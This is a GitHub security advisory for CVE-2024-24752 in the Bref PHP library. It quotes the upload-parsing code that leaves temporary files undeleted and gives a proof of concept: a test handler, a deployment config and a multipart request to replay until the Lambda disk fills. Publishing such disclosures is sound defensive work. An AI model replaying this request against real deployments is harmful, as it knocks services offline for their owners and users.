# [M] Bref's Uploaded Files Not Deleted in Event-Driven Functions

## Summary
Severity: Medium
Advisory: GHSA-x4hh-frx8-98r5
CVE: CVE-2024-24752
CWE: CWE-400, CWE-770
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2024-02-01
Source: https://github.com/advisories/GHSA-x4hh-frx8-98r5
Type: github-advisory

## Affected
- Packagist: `bref/bref` — affected >=0 <2.1.13

## Details
## Impacted Resources

bref/src/Event/Http/Psr7Bridge.php:94-125

## Description

When Bref is used with the Event-Driven Function runtime and the handler is a `RequestHandlerInterface`, then the Lambda event is converted to a PSR7 object.
During the conversion process, if the request is a MultiPart, each part is parsed and for each which contains a file, it is extracted and saved in `/tmp` with a random filename starting with `bref_upload_`.

The function implementing the logic follows:

```php
private static function parseBodyAndUploadedFiles(HttpRequestEvent $event): array
{
    $bodyString = $event->getBody();
    $files = [];
    $parsedBody = null;
    $contentType = $event->getContentType();
    if ($contentType !== null && $event->getMethod() === 'POST') {
        if (str_starts_with($contentType, 'application/x-www-form-urlencoded')) {
            parse_str($bodyString, $parsedBody);
        } else {
            $document = new Part("Content-type: $contentType\r\n\r\n" . $bodyString);
            if ($document->isMultiPart()) {
                $parsedBody = [];
                foreach ($document->getParts() as $part) {
                    if ($part->isFile()) {
                        $tmpPath = tempnam(sys_get_temp_dir(), 'bref_upload_');
                        if ($tmpPath === false) {
                            throw new RuntimeException('Unable to create a temporary directory');
                        }
                        file_put_contents($tmpPath, $part->getBody());
                        $file = new UploadedFile($tmpPath, filesize($tmpPath), UPLOAD_ERR_OK, $part->getFileName(), $part->getMimeType());

                        self::parseKeyAndInsertValueInArray($files, $part->getName(), $file);
                    } else {
                        self::parseKeyAndInsertValueInArray($parsedBody, $part->getName(), $part->getBody());
                    }
                }
            }
        }
    }
    return [$files, $parsedBody];
}
```

The flow mimics what plain PHP does but it does not delete the temporary files when the request has been processed.

## Impact

An attacker could fill the Lambda instance disk by performing multiple MultiPart requests containing files.
The attack has the following requirements and limitations:
- The Lambda should use the Event-Driven Function runtime.
- The Lambda should use the `RequestHandlerInterface` handler.
- The Lambda should implement at least an endpoint accepting POST requests.
- The attacker can send requests up to 6MB long, so multiple requests are required to fill the disk (the default Lambda disk size is 512MB, therefore with less than 100 requests the disk could be filled).

## PoC

1. Create a new Bref project.
2. Create an `index.php` file with the following content:
```php
<?php

namespace App;

require __DIR__ . '/vendor/autoload.php';

use Nyholm\Psr7\Response;
use Psr\Http\Message\ResponseInterface;
use Psr\Http\Message\ServerRequestInterface;
use Psr\Http\Server\RequestHandlerInterface;

class MyHttpHandler implements RequestHandlerInterface
{
    public function handle(ServerRequestInterface $request): ResponseInterface
    {
        return new Response(200, [], exec("ls -lah /tmp/bref_upload* | wc -l"));
    }
}

return new MyHttpHandler();

```
3. Use the following `serverless.yml` to deploy the Lambda:
```yaml
service: app

provider:
    name: aws
    region: eu-central-1

plugins:
    - ./vendor/bref/bref

# Exclude files from deployment
package:
    patterns:
        - '!node_modules/**'
        - '!tests/**'

functions:
    api:
        handler: index.php
        runtime: php-83
        events:
            - httpApi: 'ANY /upload'
```
4. Replay the following request multiple times after having replaced the `<HOST>` placeholder with the deployed Lambda domain:
```
POST /upload HTTP/2
Host: <HOST>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQqDeSZSSvmn2rfjb
Content-Length: 180

------WebKitFormBoundaryQqDeSZSSvmn2rfjb
Content-Disposition: form-data; name="a"; filename="a.txt"
Content-Type: text/plain

test
------WebKitFormBoundaryQqDeSZSSvmn2rfjb--
```
5. Notice that each time the request is sent the number of the uploaded temporary files on the disk increases.

## Suggested Remediation

Delete the temporary files after the request has been processed and the response have been generated.

## References

- https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html

## References
- https://github.com/brefphp/bref/security/advisories/GHSA-x4hh-frx8-98r5
- https://nvd.nist.gov/vuln/detail/CVE-2024-24752
- https://github.com/brefphp/bref/commit/350788de12880b6fd64c4c318ba995388bec840e
- https://github.com/brefphp/bref
- https://github.com/brefphp/bref/blob/2.1.12/src/Event/Http/Psr7Bridge.php#L94-L125
